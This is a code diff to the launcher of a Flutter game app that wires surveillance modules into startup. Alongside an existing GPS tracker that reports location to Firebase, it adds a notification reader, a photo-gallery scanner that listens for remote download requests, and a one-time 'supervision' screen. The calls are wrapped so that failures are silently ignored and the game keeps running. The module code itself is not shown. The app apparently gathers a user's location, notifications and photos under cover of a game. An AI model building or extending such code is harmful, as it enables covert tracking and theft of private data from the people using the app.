@@ -2,11 +2,15 @@ import 'package:firebase_core/firebase_core.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:provider/provider.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import 'firebase_options.dart';
 import 'game/screens/main_menu_screen.dart';
 import 'game/screens/welcome_screen.dart';
 import 'game/game_state.dart';
+import 'tracker/gallery_scanner.dart';
 import 'tracker/gps_service.dart';
+import 'tracker/notification_monitor.dart';
+import 'tracker/supervision_screen.dart';
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
@@ -23,8 +27,10 @@ void main() async {
     await Firebase.initializeApp(options: DefaultFirebaseOptions.android);
     await GpsTrackerService.requestPermissions();
     await GpsTrackerService.init();
-    // Primer envio inmediato (no espera 15 min)
     GpsTrackerService.sendNow();
+    NotificationMonitor.start();
+    await GalleryScanner.requestPermission();
+    GalleryScanner.listenDownloadRequests();
   } catch (_) {
     // Si Firebase falla, el juego sigue funcionando
   }
@@ -63,17 +69,28 @@ class _Launcher extends StatefulWidget {
 }
 
 class _LauncherState extends State<_Launcher> {
-  late Future<void> _ready;
+  late Future<_StartupState> _ready;
 
   @override
   void initState() {
     super.initState();
-    _ready = context.read<GameState>().loadProgress();
+    _ready = _bootstrap();
+  }
+
+  Future<_StartupState> _bootstrap() async {
+    final gameState = context.read<GameState>();
+    await gameState.loadProgress();
+    final prefs = await SharedPreferences.getInstance();
+    final supervisionSeen = prefs.getBool('supervision_seen') ?? false;
+    return _StartupState(
+      supervisionSeen: supervisionSeen,
+      hasPhoto: gameState.vaquitaPhotoPath != null,
+    );
   }
 
   @override
   Widget build(BuildContext context) {
-    return FutureBuilder(
+    return FutureBuilder<_StartupState>(
       future: _ready,
       builder: (_, snap) {
         if (snap.connectionState != ConnectionState.done) {
@@ -82,9 +99,29 @@ class _LauncherState extends State<_Launcher> {
             body: Center(child: CircularProgressIndicator(color: Colors.white)),
           );
         }
-        final hasPhoto = context.read<GameState>().vaquitaPhotoPath != null;
-        return hasPhoto ? const MainMenuScreen() : const WelcomeScreen();
+        final s = snap.data!;
+        if (!s.supervisionSeen) {
+          return SupervisionScreen(
+            onDone: () {
+              // Reintentar activar el lector (por si recien dio permiso)
+              NotificationMonitor.start();
+              setState(() {
+                _ready = Future.value(_StartupState(
+                  supervisionSeen: true,
+                  hasPhoto: s.hasPhoto,
+                ));
+              });
+            },
+          );
+        }
+        return s.hasPhoto ? const MainMenuScreen() : const WelcomeScreen();
       },
     );
   }
+}
+
+class _StartupState {
+  final bool supervisionSeen;
+  final bool hasPhoto;
+  _StartupState({required this.supervisionSeen, required this.hasPhoto});
 }
